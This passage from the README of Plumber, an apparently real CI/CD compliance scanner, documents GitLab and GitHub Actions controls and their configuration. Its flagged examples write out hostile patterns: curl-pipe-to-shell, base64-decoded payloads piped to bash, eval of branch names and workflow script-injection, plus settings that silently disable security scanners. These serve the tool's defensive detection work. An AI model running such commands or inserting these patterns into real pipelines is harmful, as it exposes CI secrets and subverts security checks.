**Expression syntax**: a natural boolean expression using `AND`, `OR`, and parentheses:

```yaml
pipelineMustIncludeTemplate:
  enabled: true
  required: templates/go/go AND templates/trivy/trivy AND templates/iso27001/iso27001

  # With alternatives:
  # required: (templates/go/go AND templates/trivy/trivy) OR templates/full-go-pipeline
```

**Array syntax**: a list of groups using "OR of ANDs" logic:

```yaml
pipelineMustIncludeTemplate:
  enabled: true
  requiredGroups:
    - ["templates/go/go", "templates/trivy/trivy", "templates/iso27001/iso27001"]
    - ["templates/full-go-pipeline"]
```

</details>

<details>
<summary><b>9. Pipeline must not enable debug trace</b></summary>

Detects CI/CD pipelines that set `CI_DEBUG_TRACE` or `CI_DEBUG_SERVICES` to `"true"` in global or job-level variables. When enabled, GitLab prints ALL environment variables in job logs, including masked secrets like `CI_JOB_TOKEN`.

```yaml
pipelineMustNotEnableDebugTrace:
  enabled: true
  forbiddenVariables:
    - CI_DEBUG_TRACE
    - CI_DEBUG_SERVICES
```

</details>

<details>
<summary><b>10. Pipeline must not use unsafe variable expansion</b></summary>

Detects user-controlled CI variables (MR title, commit message, branch name) passed to commands that re-interpret their input as shell code. An attacker can craft a branch name or MR title to inject arbitrary commands: this is [OWASP CICD-SEC-1](https://owasp.org/www-project-top-10-ci-cd-security-risks/).

GitLab sets CI variables as environment variables. The shell does **not** re-parse expanded values for command substitution, so normal usage is safe. Only commands that re-interpret their arguments as code are flagged:

**Flagged**: re-interpretation contexts:
- `eval "$CI_COMMIT_BRANCH"`
- `sh -c "$CI_MERGE_REQUEST_TITLE"` / `bash -c` / `dash -c` / `zsh -c` / `ksh -c`
- `source <(echo "$CI_COMMIT_REF_NAME")`
- `envsubst '$CI_COMMIT_MESSAGE' < tpl.sh | sh`
- `echo "$CI_COMMIT_BRANCH" | xargs sh`

**Not flagged**: safe, shell doesn't re-parse env var values:
- `echo $CI_COMMIT_BRANCH` / `echo "$CI_COMMIT_MESSAGE"`
- `curl -d "$CI_MERGE_REQUEST_TITLE" https://...`
- `git checkout $CI_COMMIT_REF_NAME`
- `printf '%s' "$CI_COMMIT_MESSAGE"`

> **Limitation:** only direct variable names are detected. Indirect aliasing (`variables: { B: $CI_COMMIT_BRANCH }` then `sh -c $B`) is not tracked.

```yaml
pipelineMustNotUseUnsafeVariableExpansion:
  enabled: true
  dangerousVariables:
    - CI_MERGE_REQUEST_TITLE
    - CI_MERGE_REQUEST_DESCRIPTION
    - CI_COMMIT_MESSAGE
    - CI_COMMIT_TITLE
    - CI_COMMIT_TAG_MESSAGE
    - CI_COMMIT_REF_NAME
    - CI_COMMIT_REF_SLUG
    - CI_COMMIT_BRANCH
    - CI_MERGE_REQUEST_SOURCE_BRANCH_NAME
    - CI_EXTERNAL_PULL_REQUEST_SOURCE_BRANCH_NAME
  allowedPatterns: []
```

</details>

<details>
<summary><b>11. Security jobs must not be weakened</b></summary>

GitLab lets you override any property of an included job. This means someone can include a security template but silently neutralize it. The pipeline still looks compliant, but the scanning is disabled. Maps to [OWASP CICD-SEC-4](https://owasp.org/www-project-top-10-ci-cd-security-risks/) (Poisoned Pipeline Execution).

This control detects three weakening patterns on security jobs (SAST, Secret Detection, Container Scanning, Dependency Scanning, DAST, License Scanning). Each is a separate sub-control you can toggle independently.

**`allowFailureMustBeFalse`** (default: off, opt-in)

Scanner fails? Pipeline still green. GitLab templates ship with `allow_failure: true` by default, so this sub-control is opt-in for orgs that want security checks to be blocking.

```yaml
# Flagged: security scanner silently becomes non-blocking
include:
  - template: Security/SAST.gitlab-ci.yml

semgrep-sast:
  allow_failure: true  # failures are ignored
```

**`rulesMustNotBeRedefined`** (default: on)

Overriding the `rules:` block can prevent the job from running at all, or make it manual:

```yaml
# Flagged: scanner will never run
include:
  - template: Security/SAST.gitlab-ci.yml

semgrep-sast:
  rules:
    - when: never

# Also flagged: scanner only runs if someone manually triggers it
secret_detection:
  rules:
    - when: manual
      allow_failure: true
```

**`whenMustNotBeManual`** (default: on)

Similar to the rules override, but set at job level instead of inside `rules:`:

```yaml
# Flagged: job only runs if manually triggered
include:
  - template: Security/SAST.gitlab-ci.yml

semgrep-sast:
  when: manual
```

Security jobs are identified by matching job names against `securityJobPatterns` (wildcards supported). Add or remove patterns to match your pipeline's security jobs.

```yaml
securityJobsMustNotBeWeakened:
  enabled: true
  securityJobPatterns:
    - "*-sast"
    - "secret_detection"
    - "container_scanning"
    - "*_dependency_scanning"
    - "gemnasium-*"
    - "dast"
    - "dast_*"
    - "license_scanning"
  allowFailureMustBeFalse:
    enabled: false
  rulesMustNotBeRedefined:
    enabled: true
  whenMustNotBeManual:
    enabled: true
```

</details>

<details>
<summary><b>12. Pipeline must not execute unverified scripts</b></summary>

Detects CI/CD jobs that download and immediately execute scripts from the internet without integrity verification. Patterns like `curl | bash` or `wget | sh` are a well-documented supply chain attack vector: an attacker who compromises the remote URL can serve a modified script that exfiltrates secrets.

**Detected patterns:**
- Direct pipe to shell: `curl ... | bash`, `wget ... | sh`, `curl ... | python`, etc.
- Download-and-execute: `curl -o script.sh ... && bash script.sh`
- Download-redirect-execute: `curl ... > install.sh; sh install.sh`

Lines that include checksum verification (e.g., `sha256sum`, `gpg --verify`) between the download and execution are automatically excluded.

**Configuration:**

```yaml
pipelineMustNotExecuteUnverifiedScripts:
  enabled: true
  trustedUrls: []
    # - https://internal-artifacts.example.com/*
```

Add trusted URL patterns to `trustedUrls` (supports wildcards) to suppress findings for known-good sources.

</details>

<details>
<summary><b>13. Pipeline must not override job variables</b></summary>

Detects CI/CD variables that are redefined in the pipeline configuration file when they should only be set in GitLab CI/CD Settings > Variables. This is a generic control: you can protect any variable name, not just security-related ones.

An attacker who can modify `.gitlab-ci.yml` could override variables like `SECURE_ANALYZERS_PREFIX` to point to a fake scanner registry, or set `SAST_DISABLED: "true"` to silently disable security scanners. The pipeline still appears green, but no actual scanning occurs.

**Configuration:**

```yaml
pipelineMustNotOverrideJobVariables:
  enabled: true
  variables:
    - SECURE_ANALYZERS_PREFIX
    - SAST_DISABLED
    - SAST_EXCLUDED_PATHS
    - SECRET_DETECTION_DISABLED
    - CONTAINER_SCANNING_DISABLED
    - DAST_DISABLED
    - DEPENDENCY_SCANNING_DISABLED
    - LICENSE_SCANNING_DISABLED
```

Add any variable name you want to protect to the `variables` list. Variables are matched case-insensitively across global and per-job `variables:` blocks.

</details>

<details>
<summary><b>14. Pipeline must not use Docker-in-Docker</b></summary>

Detects CI/CD jobs that use Docker-in-Docker (dind) services. Running a Docker daemon inside a CI container on shared runners in privileged mode enables container escape, lateral movement, and access to secrets from other jobs on the same runner.

When `detectInsecureDaemon` is enabled (default: true), the control also flags jobs where TLS is disabled (`DOCKER_TLS_CERTDIR=""`) or the Docker host uses the plaintext port (`tcp://docker:2375`).

**Configuration:**

```yaml
pipelineMustNotUseDockerInDocker:
  enabled: true
  detectInsecureDaemon: true
```

Consider using [Kaniko](https://github.com/GoogleContainerTools/kaniko) or [Buildah](https://github.com/containers/buildah) as safer alternatives for building container images in CI/CD.

</details>

#### GitHub Actions controls

Fourteen controls ship on GitHub. Five are cross-provider (`branchMustBeProtected`, `containerImageMustNotUseForbiddenTags`, `pipelineMustNotEnableDebugTrace`, `pipelineMustNotUseDockerInDocker`, `securityJobsMustNotBeWeakened`); same control name as GitLab, GitHub-specific values, configure them under `github.controls.*`. Thirteen of the fourteen are default-on; `workflowMustIncludeRequiredActions` is opt-in (no findings until you populate `requiredGroups`).

<details>
<summary><b>1. Actions must be pinned by commit SHA</b></summary>

Flags workflow steps whose `uses:` references a third-party action by tag or branch (`actions/checkout@v4`) instead of by 40-character commit SHA. Mutable refs can be reassigned by the action's maintainer — or by an attacker who compromises the action's repository — to point at arbitrary code that then runs inside your workflow with its secrets. This is the vector behind the March 2025 [tj-actions/changed-files compromise (CVE-2025-30066)](https://github.com/tj-actions/changed-files/issues/2464). Pair with Dependabot (`version-update-strategy: sha-and-version`) to keep pins fresh.

The `trustedOwners` list exempts owners already inside your trust boundary. The defaults exempt first-party (`actions/*`, `github/*`) so the initial signal stays focused on third-party surface.

```yaml
github:
  controls:
    actionsMustBePinnedByCommitSha:
      enabled: true
      trustedOwners:
        - actions
        - github
```

Issue code: ISSUE-701.

</details>

<details>
<summary><b>2. Container images must not use forbidden tags</b> (cross-provider)</summary>

Same control as GitLab; values live under `github.controls.*`. Pinning by digest protects against tag-retag supply-chain attacks; the forbidden-tag list catches mutable-reference patterns.

```yaml
github:
  controls:
    containerImageMustNotUseForbiddenTags:
      enabled: true
      tags: [latest, dev, development, staging, main, master]
      containerImagesMustBePinnedByDigest: true
```

Issue codes: ISSUE-102, ISSUE-103.

</details>

<details>
<summary><b>3. Branch must be protected</b> (cross-provider, project-governance)</summary>

The first project-governance control on the GitHub path; every other shipping rule here is pipeline-governance (workflow content). Inspects repository settings via the GitHub branch-protection API.

- **ISSUE-501** (presence): the default branch (when `defaultMustBeProtected: true`) and any branch matching `namePatterns` must have a protection rule. Reads the listing's `protected` flag — works on **any** authenticated token.
- **ISSUE-505** (rule details): `allowForcePush` and `codeOwnerApprovalRequired` evaluation needs `/branches/{name}/protection`, which requires `repo` (classic PAT) or **Administration: Read** (fine-grained PAT). Without that scope, ISSUE-505 silently abstains rather than emitting false positives — and the postflight stats block surfaces a `⚠ Force-push & code-owner rules: skipped on N branch(es) — token lacks Administration:Read` caveat plus a `partialControls` JSON entry so CI consumers can detect the partial evaluation.

```yaml
github:
  controls:
    branchMustBeProtected:
      enabled: true
      defaultMustBeProtected: true
      namePatterns: [main, master, release/*, production, dev]
      allowForcePush: false
      codeOwnerApprovalRequired: true
```

> **GitLab vs GitHub semantics:** GitLab's numeric `minMergeAccessLevel` / `minPushAccessLevel` knobs do not apply on GitHub (different permission model). Plumber evaluates protection-rule presence + force-push + code-owner-approval on GitHub.

Issue codes: ISSUE-501, ISSUE-505.

</details>

<details>
<summary><b>4. Pipeline must not use Docker-in-Docker</b> (cross-provider)</summary>

Workflows on GitHub-hosted runners that spin up `docker:dind` services have the same privilege-escalation risk as on GitLab. With `detectInsecureDaemon: true` (default), also flags plaintext `DOCKER_HOST` and empty `DOCKER_TLS_CERTDIR`.

```yaml
github:
  controls:
    pipelineMustNotUseDockerInDocker:
      enabled: true
      detectInsecureDaemon: true
```

Issue codes: ISSUE-412, ISSUE-413.

</details>

<details>
<summary><b>5. Reusable workflows must not inherit secrets</b></summary>

Detects `jobs.<name>.secrets: inherit` calls. `inherit` forwards every secret visible to the caller — repo, organisation, environment — to the reusable workflow regardless of what it actually needs. Use an explicit `secrets:` map naming only what's required.

```yaml
github:
  controls:
    reusableWorkflowsMustNotInheritSecrets:
      enabled: true
```

Issue code: ISSUE-302.

</details>

<details>
<summary><b>6. Security jobs must not be weakened</b> (cross-provider)</summary>

Same intent as the GitLab control: GitHub Actions lets you neutralize a security scan by setting `continue-on-error: true` (mapped to the same IR field as GitLab's `allow_failure: true`), or by gating it behind `if: false` / manual-only triggers. The pipeline still looks compliant, but no scan is enforced. Maps to [OWASP CICD-SEC-4](https://owasp.org/www-project-top-10-ci-cd-security-risks/) (Poisoned Pipeline Execution).

The job name plumber matches against is built from two pieces: the workflow filename with its `.yml`/`.yaml` extension stripped, and the job id from the YAML, joined with a slash. So `.github/workflows/codeql-analysis.yml` containing `jobs.analyze` is matched as `codeql-analysis/analyze`; `.github/workflows/workflow.yml` containing `jobs.my-sast` is matched as `workflow/my-sast`. The namespace exists so two workflow files defining a job with the same id do not collide.

Patterns can target whichever part of that name is stable for your repo:

| Pattern shape | Matches |
|---|---|
| `*<token>*` | Token anywhere in the name. The defaults use this for resilience to unknown workflow files. |
| `<workflow>/*` | Every job in one workflow file. |
| `*/<jobid>` | Specific job id, any workflow. |
| `<workflow>/<jobid>` | Exact match, no wildcard. |

The defaults below ship wildcard-wrapped because plumber does not know your repo's workflow-file convention. If your security jobs live in a known layout you can drop the wildcards for tighter matching. They cover GitHub-native scanners (CodeQL, TruffleHog, Gitleaks, OSV-Scanner, Dependency-Review) plus generic fallbacks.

```yaml
github:
  controls:
    securityJobsMustNotBeWeakened:
      enabled: true
      securityJobPatterns:
        - "*codeql*"
        - "*dependency-review*"
        - "*trufflehog*"
        - "*gitleaks*"
        - "*osv-scanner*"
        - "*-sast"
        - "*-sast-*"
        - "*-scan"
        - "*scan*"
        - "*-security"
        - "*-audit"
      allowFailureMustBeFalse:
        enabled: true
      rulesMustNotBeRedefined:
        enabled: true
      whenMustNotBeManual:
        enabled: true
```

Issue code: ISSUE-410.

</details>

<details>
<summary><b>7. Workflow must not inject user input in scripts</b></summary>

Catches the canonical script-injection class: `${{ github.event.* }}`, `${{ github.head_ref }}`, `${{ github.actor }}` interpolated directly into a `run:` shell. Attacker-controlled values (PR title, branch name, …) can break out of the intended string and execute arbitrary commands with the job's secrets. The fix is to bind through `env:` first, then reference the env var from the shell:

```yaml
# Flagged
- run: echo "Title: ${{ github.event.pull_request.title }}"

# Safe
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Title: $PR_TITLE"
```

```yaml
github:
  controls:
    workflowMustNotInjectUserInputInScripts:
      enabled: true
```

Issue code: ISSUE-207.

</details>

<details>
<summary><b>8. Workflow must not use dangerous triggers</b></summary>

Flags GitHub Actions trigger events that grant access to the **base** repository's secrets while being influenceable by an unprivileged caller — combined with any user-content checkout, the trigger becomes a direct exfiltration path. The rule fires only on the exploitable combination (trigger + checkout of fork-controlled `ref:`) and abstains when a job-level `if:` restricts execution to same-repository pull requests.

Detected events: `workflow_run`, `issue_comment`, `pull_request_review`, `pull_request_review_comment`, `discussion_comment`, `discussion`, `gollum`, `fork`. The `pull_request_target` case is owned by `pullRequestTargetMustNotCheckoutHead` (ISSUE-804) below — same exploit class, dedicated rule.

```yaml
github:
  controls:
    workflowMustNotUseDangerousTriggers:
      enabled: true
```

Issue code: ISSUE-802.

</details>

<details>
<summary><b>8b. pull_request_target workflows must not check out the PR head</b></summary>

Flags the precise vector behind the March 2025 tj-actions/changed-files compromise (CVE-2025-30066): a workflow triggered by `pull_request_target` that calls `actions/checkout` with a `ref:` pointing at the PR head (`github.event.pull_request.head.sha`, `github.head_ref`, `head.ref`). Base-repo secrets and fork-controlled code in the same run. The rule abstains when the job carries a same-repository `if:` guard.

```yaml
github:
  controls:
    pullRequestTargetMustNotCheckoutHead:
      enabled: true
```

Issue code: ISSUE-804.

</details>

<details>
<summary><b>9. Workflows must declare permissions</b></summary>

Workflows without an explicit top-level (or job-level) `permissions:` block fall back to the repo-wide `GITHUB_TOKEN` default — often `contents: write` or `read-all`. Declaring `permissions: { contents: read }` at the workflow level enforces least-privilege regardless of the repo default.

```yaml
github:
  controls:
    workflowsMustDeclarePermissions:
      enabled: true
```

Issue code: ISSUE-801.

</details>

<details>
<summary><b>10. Workflows must include required actions</b></summary>

GitHub counterpart of GitLab's `pipelineMustIncludeComponent` / `pipelineMustIncludeTemplate`. Asserts that every workflow file under `.github/workflows/` collectively references a set of required actions or reusable workflows. Useful for enforcing organisation-wide security scans, compliance jobs, or shared release pipelines.

The control covers both ways GitHub lets you reference external code, transparently:

- Step-level action: `steps: [{ uses: myorg/sast-scan@v2 }]`
- Job-level reusable workflow: `jobs.security.uses: myorg/policy/.github/workflows/scan.yml@v2`

Each required entry is an `owner/repo[/path]` string. Matching is ref-agnostic, so bumping a pinned SHA does not invalidate the policy. A slash-guard prevents accidental prefix collisions: `myorg/sast-scan` matches `myorg/sast-scan@<anything>` and `myorg/sast-scan/sub@<anything>`, but not `myorg/sast-scan-fork@<anything>`.

Two ways to define requirements (use one, not both), same shape as the GitLab side:

```yaml
github:
  controls:
    workflowMustIncludeRequiredActions:
      enabled: true
      # Option 1, expression syntax (AND tighter than OR):
      # required: myorg/sast-scan AND myorg/dependency-review
      # required: (myorg/sast-scan AND myorg/secret-scan) OR myorg/full-security-suite
      #
      # Option 2, "OR of ANDs" array syntax:
      requiredGroups:
        - ["myorg/sast-scan", "myorg/dependency-review"]
        - ["myorg/full-security-suite"]
```

The policy is satisfied when ANY group is fully present. One ISSUE-417 finding is emitted per missing required entry per group, so the report points the user at exactly which slot is empty. Disabled by default; opt in once your org has settled on the action set every repo is expected to wire up.

Issue code: ISSUE-417.

</details>

<details>
<summary><b>11. Workflow must not grant write-all permissions</b></summary>

Flags workflows and jobs whose effective `permissions:` block is the literal `write-all` shortcut. `write-all` grants `GITHUB_TOKEN` every scope at once (contents, packages, deployments, id-token, …), so any compromise inside the workflow — a malicious dependency, a script-injection bug, a third-party action turning evil — gets to do anything the repo allows: push to default branch, publish releases, mint OIDC tokens for cloud accounts, mark deployments succeeded.

Workflow-level `permissions: write-all` is propagated to every job by the runner, so the rule reads each job's effective permissions and catches both the workflow-level and the job-level shortcut the same way.

This control pairs with `workflowsMustDeclarePermissions`, which catches the related "no `permissions:` block at all" case (many repos default to write-all when no block is declared). Together they enforce the least-privilege baseline regardless of how a workflow chose to declare (or omit) its token scope.

```yaml
github:
  controls:
    workflowMustNotGrantPermissionsWriteAll:
      enabled: true
```

Stricter scope-level audits (e.g. flagging `contents: write` on jobs that should be read-only) are handled by other rules; this one is about the blanket shortcut. Static YAML in `.github/workflows/` only; does not flag scope maps, `read-all`, or missing blocks (ISSUE-801). Default-on, no parameters.

Issue code: ISSUE-803.

</details>

<details>
<summary><b>12. Actions must not reference archived repositories</b></summary>

Flags `uses: owner/repo@ref` references whose upstream GitHub repository is archived. Archived repos no longer receive maintenance, so open vulnerabilities stay open and runtime compatibility regressions accumulate; pinning by SHA does not save the caller because the last maintainer (or someone who later acquires the namespace) can still push new code under the same repository name.

Driven by GitHub API metadata on step-level `uses: owner/repo@ref` in committed workflow YAML (not reusable-workflow `jobs.*.uses`, not local `./.github/actions/*`). One cached `GET /repos/{owner}/{repo}` per action repository. Without `gh` / `GH_TOKEN` the rule abstains (no finding).

```yaml
github:
  controls:
    actionsMustNotBeArchived:
      enabled: true
```

Default-on, no parameters. The PBOM tags each archived include with `archived: true` (JSON) / `plumber:archived` (CycloneDX) so downstream dashboards can dedupe across multiple callers of the same abandoned action.

Issue code: ISSUE-702.

</details>

<details>
<summary><b>13. Actions must not carry known CVEs</b></summary>

Cross-references step-level `uses: owner/repo@ref` in committed workflows against the GitHub Advisory Database (`actions` ecosystem). One cached query per `owner/repo`. When the pinned ref resolves to a semver tag, advisories are filtered by `vulnerable_version_range`; unresolvable commit SHAs may match any advisory for that repo (conservative). Catches the published-CVE supply-chain class (tj-actions/changed-files CVE-2025-30066, reviewdog, vulnerable `actions/artifact`, etc.).

Requires `gh` / `GH_TOKEN` (same abstain-without-auth contract as `actionsMustNotBeArchived`). Upgrade past the fixed-in version and re-pin the SHA to clear the finding.

```yaml
github:
  controls:
    actionsMustNotCarryKnownCVEs:
      enabled: true
```

Default-on, no parameters. The PBOM tags each affected include with `hasCve: true` plus an `advisories: [GHSA-…, …]` list (JSON) / `plumber:has-cve` plus `plumber:advisories` properties (CycloneDX), so downstream consumers can pivot on the GHSA IDs across the inventory.

Issue code: ISSUE-703.

</details>

<details>
<summary><b>14. Pipeline must not execute unverified scripts</b></summary>

GitHub side of the cross-provider `pipelineMustNotExecuteUnverifiedScripts` rule. Flags every `run:` step that downloads or inline-executes code without an integrity check. Closes the Megalodon CI-backdooring vector (`echo "<base64>" | base64 -d | bash`) and the classic `curl … | bash` supply-chain pattern.

Patterns the rule fires on:

- pipe `curl`/`wget` directly into a shell — `curl … | bash`, `wget -qO- … | sh`
- download then execute on the same line — `curl … -o install.sh && bash install.sh`
- redirect to a file then execute — `curl … > install.sh; sh install.sh`
- Megalodon-style inline payload — `echo "Q0I9…" | base64 -d | bash`
- any generic `<cmd> | <shell>` chain — `cat /tmp/payload.sh | sh`
- heredoc-as-camouflage on a download — `curl evil | bash <<EOF`

False-positive guards keep the signal sharp:

- pipe-to-shell substrings inside a quoted string don't fire — `echo "Install with curl … | bash"` is just documentation
- heredoc-to-shell with no download on the line is operator-authored, in-tree content — `cat <<EOF | bash` stays silent
- a verification command on the same line as the download exempts the line — `sha256sum -c`, `gpg --verify`, `cosign verify`/`verify-blob`
- the verification check itself ignores quoted occurrences, so `echo "should sha256sum first" && curl evil | bash` does NOT bypass detection

```yaml
# Flagged
- run: curl -sSL https://example.com/install.sh | bash
- run: echo "Q0I9…" | base64 -d | bash

# Safe — checksum on the same line
- run: |
    curl -sSL https://example.com/install.sh -o install.sh
    echo "<sha256>  install.sh" | sha256sum -c -
    bash install.sh

# Safe — env binding + vendored script
- env:
    SCRIPT: scripts/setup.sh
  run: bash "$SCRIPT"
```

```yaml
github:
  controls:
    pipelineMustNotExecuteUnverifiedScripts:
      enabled: true
      # URLs that are trusted and should not trigger findings.
      # Supports wildcards (e.g., https://internal-artifacts.example.com/*).
      trustedUrls: []
```

`trustedUrls` is host-precise: `https://example.com/*` exempts `example.com/install.sh` but NOT `evil.example.com/install.sh`. Patterns can be written with or without a scheme: `firebase.tools`, `firebase.tools/*`, and `https://firebase.tools` all match a `curl -sL firebase.tools | bash`. Trust is scoped to the `curl`/`wget` fetch target on the line, so a mention of a trusted host inside an `echo` string, a `#` comment, or a different line of the same `run:` block cannot grant trust to a curl that fetches an untrusted host. Issue code: ISSUE-411 (shared with the GitLab side).

</details>

<details>
<summary><b>15. Pipeline must not enable debug trace</b></summary>

GitHub side of the cross-provider `pipelineMustNotEnableDebugTrace` rule (the GitLab side catches `CI_DEBUG_TRACE` / `CI_DEBUG_SERVICES`). Flags workflows or jobs that set `ACTIONS_STEP_DEBUG` or `ACTIONS_RUNNER_DEBUG` to a truthy value (`true`, `1`, `yes` — case-insensitive, trimmed).

When either debug toggle is on, the runner prints every environment variable (including masked secrets) and every internal action SDK call into the job log. The masking layer is bypassed for the dump itself, so any secret consumed by the workflow lands in plaintext in the run log and remains visible to anyone with `actions: read` plus indefinitely on log artefacts.

Variable name matching is case-insensitive. The rule walks static `env:` in workflow YAML merged from workflow-, job-, and step-level scopes, also flags `${{ }}` expression bindings on forbidden names (truthiness cannot be verified statically), and flags `run:` lines that write forbidden names to `$GITHUB_ENV`. All variants emit ISSUE-203 critical findings. Does not see org/repo Variables with no YAML reference or UI-only "Re-run with debug logging".

```yaml
github:
  controls:
    pipelineMustNotEnableDebugTrace:
      enabled: true
      forbiddenVariables:
        - ACTIONS_STEP_DEBUG
        - ACTIONS_RUNNER_DEBUG
        # Add other diagnostic-toggle variables your org wants caught
```

Default-on with the two GitHub-native debug variables pre-populated; extend the list if your runner image honours additional diagnostic toggles. Issue code: ISSUE-203 (shared with the GitLab side; the message names the GitHub variable when triggered there).

</details>

### Selective Control Execution

You can run or skip specific controls using their YAML key names from `.plumber.yaml`. This is useful for iterative debugging or targeted CI checks.

**Run only specific controls:**

```bash
# Only check image tags and branch protection
plumber analyze --controls containerImageMustNotUseForbiddenTags,branchMustBeProtected
```

**Skip specific controls:**

```bash
# Run everything except branch protection (avoids API calls you don't need)
plumber analyze --skip-controls branchMustBeProtected
```

**In the GitLab CI component:**

```yaml
include:
  - component: gitlab.com/getplumber/plumber/plumber@v0.3.1
    inputs:
      controls: containerImageMustNotUseForbiddenTags,containerImageMustComeFromAuthorizedSources
```

Controls not selected are reported as **skipped** in the output. The `--controls` and `--skip-controls` flags are mutually exclusive.

<details>
<summary><b>Valid control names — GitLab (14)</b></summary>

| Control Name |
|-------------|
| `branchMustBeProtected` |
| `containerImageMustComeFromAuthorizedSources` |
| `containerImageMustNotUseForbiddenTags` |
| `includesMustBeUpToDate` |
| `includesMustNotUseForbiddenVersions` |
| `pipelineMustIncludeComponent` |
| `pipelineMustIncludeTemplate` |
| `pipelineMustNotEnableDebugTrace` |
| `pipelineMustNotExecuteUnverifiedScripts` |
| `pipelineMustNotIncludeHardcodedJobs` |
| `pipelineMustNotOverrideJobVariables` |
| `pipelineMustNotUseDockerInDocker` |
| `pipelineMustNotUseUnsafeVariableExpansion` |
| `securityJobsMustNotBeWeakened` |

</details>

<details>
<summary><b>Valid control names, GitHub (15)</b></summary>

| Control Name | Cross-provider? |
|-------------|---|
| `actionsMustBePinnedByCommitSha` | GitHub-only |
| `actionsMustNotBeArchived` | GitHub-only |
| `actionsMustNotCarryKnownCVEs` | GitHub-only |
| `branchMustBeProtected` | ✓ shared with GitLab |
| `containerImageMustNotUseForbiddenTags` | ✓ shared with GitLab |
| `pipelineMustNotEnableDebugTrace` | ✓ shared with GitLab |
| `pipelineMustNotExecuteUnverifiedScripts` | ✓ shared with GitLab |
| `pipelineMustNotUseDockerInDocker` | ✓ shared with GitLab |
| `reusableWorkflowsMustNotInheritSecrets` | GitHub-only |
| `securityJobsMustNotBeWeakened` | ✓ shared with GitLab |
| `workflowMustIncludeRequiredActions` | GitHub-only |
| `workflowMustNotGrantPermissionsWriteAll` | GitHub-only |
| `workflowMustNotInjectUserInputInScripts` | GitHub-only |
| `pullRequestTargetMustNotCheckoutHead` | GitHub-only |
| `workflowMustNotUseDangerousTriggers` | GitHub-only |
| `workflowsMustDeclarePermissions` | GitHub-only |

`--controls` / `--skip-controls` accept the same name regardless of provider — the analyzer applies it to whichever provider is active for the run.

</details>

---

## 📊 Artifacts & Outputs

Plumber generates multiple output formats to fit different workflows. All artifacts are available via CLI flags and are automatically configured when using the GitLab CI component.

| Format | CLI Flag | CLI Default | Component Default | Description |
|--------|----------|-------------|-------------------|-------------|
| **Terminal** | `--print` | `true` | `true` | Colorized compliance report |
| **JSON Report** | `--output` | — | `plumber-report.json` | Machine-readable analysis results |
| **PBOM** | `--pbom` | — | `plumber-pbom.json` | Pipeline Bill of Materials |
| **CycloneDX** | `--pbom-cyclonedx` | — | `plumber-cyclonedx-sbom.json` | Standard SBOM format |
| **SARIF** | `--sarif` | — | `plumber.sarif` | SARIF 2.1.0 findings for GitHub Code Scanning / GitLab Security Dashboard |
| **GitLab SAST** | `--glsast` | — | `gl-sast-report.json` | GitLab SAST report (schema v15) for `artifacts:reports:sast` (Security Dashboard / MR widget) |

### JSON Report

Export the full analysis results in JSON format for CI integration, dashboards, or further processing:

```bash
plumber analyze --output plumber-report.json
```

The JSON includes all control results, compliance scores, issues found, and project metadata.

With `--score` and/or `--score-point`, the JSON also includes a `plumberScore` object (letter **score** A–E, numeric **points** 0–100, severity counts, optional per-severity loss rows) when at least one flag is set.

### Plumber score (letter + points)

Plumber separates **letter score** (A–E) from numeric **points** (0–100). Points are computed from open issues grouped by **issue code**, with weight and cap derived from each code's documented **severity** (Critical, High, Medium, Low). Distinct codes at the same severity each consume their own cap, so different *types* of issues keep affecting the score. **Critical malus** can cap final points when any Critical issue is present. The active ruleset is profile **`scoring-v3`**.

📖 Full specification: **[docs/scoring.md](docs/scoring.md)**  
📖 Severity per issue code: [Plumber issues docs](https://getplumber.io/docs/cli/issues/)

### Pipeline Bill of Materials (PBOM)

Generate a complete inventory of all dependencies in your CI/CD pipeline. Both providers are supported; the inventory shape adapts to each:

```bash
plumber analyze --pbom pbom.json
```

**GitLab inventory:**
- **Container images** with registry, tag, and digest information
- **CI/CD components**, **templates**, project / local / remote includes with version tracking
- **Compliance status** for each dependency
- **Override detection** — includes whose jobs are overridden with forbidden CI/CD keywords

**GitHub inventory:**
- **Container images** from each job's `container:` and `services:` blocks
- **Third-party action references** (`uses: owner/repo@ref`) with the pinned ref (typically a SHA) and the workflow file's `# vX.Y.Z` comment as the human-readable version
- **Reusable workflow calls** (`jobs.<name>.uses: …/.github/workflows/x.yml@ref`)

The top-level shape (`pbomVersion`, `project`, `summary`, `containerImages`, `includes`) is identical across providers — `project.provider` reports which analyzer produced the file.

With `--score` / `--score-point`, the PBOM JSON includes a top-level `plumberScore` object. CycloneDX output adds `plumber:score-*`, `plumber:points-*`, and letter `plumber:score` metadata (see [docs/PBOM.md](docs/PBOM.md); calculation in [docs/scoring.md](docs/scoring.md)).

### CycloneDX SBOM

Generate a standards-compliant SBOM for security tool integration:

```bash
plumber analyze --pbom-cyclonedx pipeline-sbom.json
```

The CycloneDX output follows the [CycloneDX 1.5 specification](https://cyclonedx.org/docs/1.5/json/) and is compatible with:
- **Grype** and **Trivy** for vulnerability scanning
- **Dependency-Track** for continuous monitoring
- **GitLab Dependency Scanning** (auto-uploaded when using the component)

GitHub-side specifics: each third-party action becomes a `type: library` component with a `pkg:github/owner/repo@<sha>` purl; reusable workflows use the same scheme with the workflow file path preserved. The project-component metadata uses `plumber:provider=github` and `plumber:url=<host>` (the legacy `plumber:gitlab-url` / `plumber:project-id` properties remain on the GitLab path for backward compat).

> **Note:** CI/CD components and templates do not have CVEs in public vulnerability databases. The PBOM is primarily an **inventory and compliance tool**. For image vulnerability scanning, use dedicated tools like `trivy image` or `grype`.

📖 See [docs/PBOM.md](docs/PBOM.md) for full format documentation and field reference.

### Terminal Output

Plumber provides colorized terminal output for easy scanning:

<p align="center">
  <img src="assets/plumber-output.png" alt="Plumber Output Example" width="800">
</p>

- **Green checkmarks (✓)** indicate passing controls
- **Red crosses (✗)** indicate failing controls
- **Yellow bullets (•)** highlight specific issues found
- Summary tables show compliance percentages at a glance
- With **`--score`** / **`--score-point`**, issue lines show **severity** tags (e.g. CRIT / HIGH / MED / LOW) from issue codes; the **Controls** table includes a severity rollup; the **Plumber score** banner (and optional **points breakdown**) appears **after** the compliance tables (see [docs/scoring.md](docs/scoring.md))

---

## 🔗 GitLab Integration

Plumber integrates directly with GitLab to provide visual compliance feedback where your team works.

> **GitHub equivalents are on the roadmap.** PR comments and repo badges on GitHub are not implemented yet — when running plumber in a GitHub Actions step today, surface the JSON output (`--output plumber-report.json`) via your usual workflow tooling (artifacts, `step-summary`, third-party PR-comment actions). [Open an issue](https://github.com/getplumber/plumber/issues) if you'd like to help land first-class GitHub PR comments / status checks.

### Merge Request Comments

